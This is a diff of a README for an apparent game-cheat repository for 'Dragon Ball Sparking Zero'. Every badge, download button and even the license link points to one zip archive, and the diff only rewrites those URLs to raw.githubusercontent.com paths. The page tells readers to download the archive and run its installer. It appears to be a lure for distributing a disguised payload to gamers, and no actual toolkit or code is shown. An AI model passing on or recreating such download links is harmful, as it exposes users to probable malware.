@@ -1,17 +1,17 @@
 # Dragon Ball Sparking Zero Cheats 🐉⚡
 
-![Release](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
-![MIT License](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
-![Platform Support](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip%7CMac%7CLinux-blue)
-![API Integration](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip%20Claude-lightgrey)
-![Stars](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
+![Release](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
+![MIT License](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
+![Platform Support](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip%7CMac%7CLinux-blue)
+![API Integration](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip%20Claude-lightgrey)
+![Stars](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
 
 **Unleash your hidden power with the ultimate Dragon Ball Sparking Zero cheats toolkit!** Bend the limits of gameplay, personalize your experience, and evolve your strategy with innovative tools guided by adaptive technology, AI integration, and boundary-pushing features.  
 *Channel your inner Super Saiyan and discover everything this star-forged repository offers.*
 
 ---
 
-[![Download](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
+[![Download](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
 
 ---
 
@@ -99,7 +99,7 @@ No holiday downtime—support tickets auto-routed and community forums never clo
 2. **Download the Toolkit**:  
    Click the badge below to summon the latest version through the hyperdriven portal!
 
-   [![Download](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
+   [![Download](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
 
 3. **Launch the Installer**:  
    Open the downloaded toolkit. Run the installer and follow the on-screen prompts (installation wizard will autodetect your OS and language preferences).
@@ -120,11 +120,11 @@ This project is designed for educational and personal enhancement. Always respec
 
 ## 📜 MIT License (2025)
 
-Distributed under the MIT License. For full details, please see the [MIT license](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip).
+Distributed under the MIT License. For full details, please see the [MIT license](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip).
 
 ---
 
-[![Download](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)](https://github.com/zainkalkhan/sparking-zero-unlock-guide/raw/refs/heads/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
+[![Download](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)](https://raw.githubusercontent.com/zainkalkhan/sparking-zero-unlock-guide/branch/forsakenly/unlock_guide_sparking_zero_v1.0-beta.2.zip)
 
 ---
 
